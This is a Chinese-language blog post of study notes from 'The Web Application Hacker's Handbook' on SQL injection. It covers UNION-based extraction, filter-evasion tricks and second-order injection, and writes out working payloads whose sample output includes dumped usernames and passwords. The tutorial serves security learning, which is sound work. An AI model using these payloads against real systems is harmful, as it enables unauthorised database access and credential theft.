---
layout:     post
title:      Chapter 9 Attacking Data Stores(2)-Injecting into SQL(3)
subtitle:   SQL注入(3)
date:       2020-03-15
author:     D
header-img: 
catalog: true
mermaid: true
tags: [web hacking]
---

参考:**The Web Application Hackers Handbook** Chapter 9

# 1.Extracting Data with UNION

让我们看一下针对MS-SQL数据库的攻击，但使用的方法适用于所有数据库技术。 考虑一个通讯录应用程序，该应用程序允许用户维护联系人列表以及查询和更新其详细信息。 当用户在通讯录中搜索名为Matthew的联系人时，其浏览器将发布以下参数：
```
Name=Matthew
```
并且该应用程序返回以下结果：

|NAME|E-MAIL|
|-|-|
|Matthew Adamson|handytrick@gmail.com|

首先，我们需要确定所需的列数。 测试单个列会导致错误消息：
```
Name=Matthew'%20union%20select%20null--

All queries combined using a UNION, INTERSECT or EXCEPT operator must
have an equal number of expressions in their target lists.
```
我们添加第二个NULL，并且发生相同的错误。 因此，我们继续添加NULL，直到执行查询为止，并在结果表中生成一个附加项：
```
Name=Matthew'%20union%20select%20null,null,null,null,null--
```

|NAME|E-MAIL|
|-|-|
|Matthew Adamson|handytrick@gmail.com|
|[empty]|[empty]|

现在，我们验证查询中的第一列是否包含字符串数据：
```
Name=Matthew'%20union%20select%20'a',null,null,null,null--
```

|NAME|E-MAIL|
|-|-|
|Matthew Adamson|handytrick@gmail.com|
|a||

下一步是找出可能包含有趣信息的数据库表和列的名称。 我们可以通过查询元数据表`information_schema.columns`来做到这一点，该表包含数据库中所有表和列名的详细信息。 这些可以通过以下查询检索：
```
Name=Matthew'%20union%20select%20table_name,column_name,null,null,
null%20from%20information_schema.columns--
```

NAME|E-MAIL|
|-|-|
|Matthew Adamson|handytrick@gmail.com|
|shop_items|price|
|shop_items|prodid|
|shop_items|prodname|
|addr_book|contactemail|
|addr_book|contactname|
|users|username|
|users|password|

在这里，用户表显然是开始提取数据的地方。 我们可以使用以下查询从用户表中提取数据：
```
Name=Matthew'%20UNION%20select%20username,password,null,null,null%20
from%20users--
```

NAME|E-MAIL|
|-|-|
|Matthew Adamson|handytrick@gmail.com|
|administrator|fme69|
|dev|uber|
|marcus|8pinto|
|smith|twosixty|
|jlo|6kdown|

**TIP**
MS-SQL，MySQL和许多其他数据库（包括SQLite和Postgresql）都支持`information_schema`。 它旨在保存数据库元数据，使其成为想要检查数据库的攻击者的主要目标。 请注意，Oracle不支持该架构。 以Oracle数据库为目标时，攻击将在其他方面完全相同。 但是，您将使用查询`SELECT table_name,column_name FROM all_tab_columns`来检索有关数据库中表和列的信息。（您将使用`user_tab_columns`表仅关注当前数据库。）在分析大型数据库中的攻击点时，它会 通常最好直接寻找有趣的列名而不是表。 例如：
```
SELECT table_name,column_name FROM information_schema.columns where
column_name LIKE '%PASS%'
```

**TIP**
从目标表返回多个列时，可以将它们串联到单个列中。 这使得检索更加简单，因为它只需要识别原始查询中的单个`varchar`字段即可：
- **Oracle:** `SELECT table_name||':'||column_name FROM all_tab_columns`
- **MS-SQL:** `SELECT table_name+':'+column_name from information_schema.columns`
- **MySQL:** `SELECT CONCAT(table_name,':',column_name) from information_schema.columns`

# 2.Bypassing Filters

在某些情况下，容易受到SQL注入攻击的应用程序可能会实现各种输入过滤器，从而阻止您不受限制地利用该缺陷。 例如，应用程序可能会删除或清除某些字符，或者可能会阻止常见的SQL关键字。 这种过滤器通常容易受到绕过攻击，因此在这种情况下，您应该尝试许多技巧。

## 2.1 Avoiding Blocked Characters
如果应用程序删除或编码了一些在SQL注入攻击中经常使用的字符，那么您可能仍然可以在没有这些字符的情况下进行攻击：
- 如果要注入数字数据字段或列名，则不需要单引号。 如果您需要在攻击有效载荷中引入字符串，则无需引号即可执行此操作。 您可以使用各种字符串函数来使用单个字符的ASCII代码动态地构建字符串。 例如，以下分别用于Oracle和MS-SQL的两个查询等效于`select ename,sal from emp where ename='marcus'`:
```
SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||
CHR(114)||CHR(99)||CHR(117)||CHR(115)

SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)
+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)
```
- 如果注释符号被阻止，则即使不使用注释符号，您通常也可以对注入的数据进行处理，以使其不会破坏周围查询的语法。 例如，代替注入：
```
' or 1=1--
```
你可以注入:
```
' or 'a'='a
```
- 尝试将批处理查询注入MS-SQL数据库时，不需要使用分号分隔符。 只要您修复了批处理中所有查询的语法，无论是否包含分号，查询解析器都将正确解释它们。

## 2.2 Circumventing Simple Validation

某些输入验证例程使用简单的黑名单，并阻止或删除此列表中显示的所有提供的数据。 在这种情况下，应尝试进行标准攻击，以查找验证和规范化机制中的常见缺陷，如第2章所述。例如，如果`SELECT`关键字被阻止或删除，则可以尝试以下绕过方法：
```
SeLeCt
%00SELECT
SELSELECTECT
%53%45%4c%45%43%54
%2553%2545%254c%2545%2543%2554
```

## 2.3 Using SQL Comments

您可以通过将内联注释嵌入到符号/ *和* /之间，以与C ++相同的方式将其插入SQL语句中。 如果应用程序从输入中阻止或去除空格，则可以使用注释在注入的数据中模拟空格。 例如：
```
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
```
在MySQL中，甚至可以在关键字本身中插入注释，这提供了另一种绕过某些输入验证过滤器的方法，同时保留了实际查询的语法。 例如：
```
SEL/*foo*/ECT username,password FR/*foo*/OM users
```

## 2.4 Exploiting Defective Filters

输入验证例程通常包含逻辑缺陷，您可以利用这些逻辑缺陷将阻塞的输入走私通过过滤器。 这些攻击通常利用多个验证步骤的顺序，或者无法递归应用清理逻辑。 第11章介绍了此类攻击。

# 3.Second-Order SQL Injection

与二阶SQL注入有关的过滤器旁路是一种特别有趣的类型。 将数据首次插入数据库后，许多应用程序都可以安全地处理数据。 一旦数据存储在数据库中，以后可能会由应用程序本身或其他后端进程以不安全的方式对其进行处理。其中许多质量与面向Internet的主要应用程序的质量不同，但具有很高的 特权数据库帐户。

在某些应用中，来自用户的输入会在到达时通过转义单引号进行验证。 在原始书籍搜索示例中，这种方法似乎很有效。 当用户输入搜索词O’Reilly时，应用程序将进行以下查询：
```
SELECT author,title,year FROM books WHERE publisher = 'O''Reilly'
```
在此，用户提供的单引号已转换为两个单引号。 因此，传递给数据库的项目与用户输入的原始表达式具有相同的字面意义。

加倍方法的一个问题出现在更复杂的情况下，其中相同的数据项通过多个SQL查询，然后被写入数据库，然后不止一次地回读。 这是简单输入验证与边界验证相对的缺点的一个示例，如第2章所述。

回想一下允许用户自行注册并在INSERT语句中包含SQL注入代码的应用程序。 假设开发人员试图通过将用户数据中出现的任何单引号加倍来修复漏洞。 尝试注册用户名`foo'`会导致以下查询，这对数据库没有任何问题：
```
INSERT INTO users (username, password, ID, privs) VALUES ('foo''',
'secret', 2248, 1)
```
到目前为止，一切都很好。 但是，假设该应用程序还实现了密码更改功能。 只有经过身份验证的用户才能使用此功能，但是为了获得额外的保护，该应用程序要求用户提交其旧密码。 然后，通过从数据库中检索用户的当前密码并比较两个字符串来验证这是正确的。 为此，它首先从数据库中检索用户的用户名，然后构造以下查询：
```
SELECT password FROM users WHERE username = 'foo''
```
因为存储在数据库中的用户名是文字字符串foo'，所以这是查询该值时数据库返回的值。 倍增转义序列仅在将字符串传递到数据库的位置使用。 因此，当应用程序重用此字符串并将其嵌入第二个查询中时，会出现SQL注入错误，并且用户原来的错误输入将直接嵌入到查询中。 当用户尝试更改密码时，应用程序将返回以下消息，其中显示了错误：
```
Unclosed quotation mark before the character string 'foo
```
要利用此漏洞，攻击者可以简单地注册一个包含其手工输入的用户名，然后尝试更改其密码。 例如，如果注册了以下用户名：
```
' or 1 in (select password from users where username='admin')--
```
注册步骤本身将得到安全处理。 攻击者尝试更改密码时，将执行其注入的查询，并显示以下消息，其中显示了管理员用户的密码：
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting
the varchar value ‘fme69’ to a column of data type int.
```
攻击者已成功绕过了旨在阻止SQL注入攻击的输入验证。 现在，他可以在数据库内执行任意查询并检索结果。

[Chapter 9 Attacking Data Stores(2)-Injecting into SQL(1)](https://dm116.github.io/2020/03/14/attacking-data-stores_2_2/)<br>
[Chapter 9 Attacking Data Stores(2)-Injecting into SQL(4)](https://dm116.github.io/2020/03/15/attacking-data-stores_2_4/)<br>
